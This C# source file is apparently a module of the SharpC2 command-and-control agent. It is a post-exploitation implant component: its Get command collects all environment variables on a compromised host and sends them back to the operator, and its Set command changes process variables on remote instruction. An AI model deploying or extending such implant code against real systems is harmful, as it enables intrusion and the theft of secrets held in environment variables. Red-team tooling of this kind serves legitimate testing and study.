using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;

using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;

namespace Agent.Modules
{
    public class EnvModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Env",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Get",
                        Delegate = GetEnvironmentVariables
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Set",
                        Delegate = SetEnvironmentVariable
                    }
                }
            };
        }

        private void GetEnvironmentVariables(string AgentID, C2Data C2Data)
        {
            try
            {
                var result = new SharpC2ResultList<EnvironmentVariableResult>();
                var variables = Environment.GetEnvironmentVariables();

                foreach (DictionaryEntry env in variables)
                {
                    result.Add(new EnvironmentVariableResult
                    {
                        Key = env.Key as string,
                        Value = env.Value as string
                    });
                }

                Agent.SendMessage(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void SetEnvironmentVariable(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;

                var name = (string)parameters.FirstOrDefault(p => p.Name.Equals("EnvName", StringComparison.OrdinalIgnoreCase)).Value;
                var value = (string)parameters.FirstOrDefault(p => p.Name.Equals("EnvValue", StringComparison.OrdinalIgnoreCase)).Value;

                Environment.SetEnvironmentVariable(name, value, EnvironmentVariableTarget.Process);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
    }
}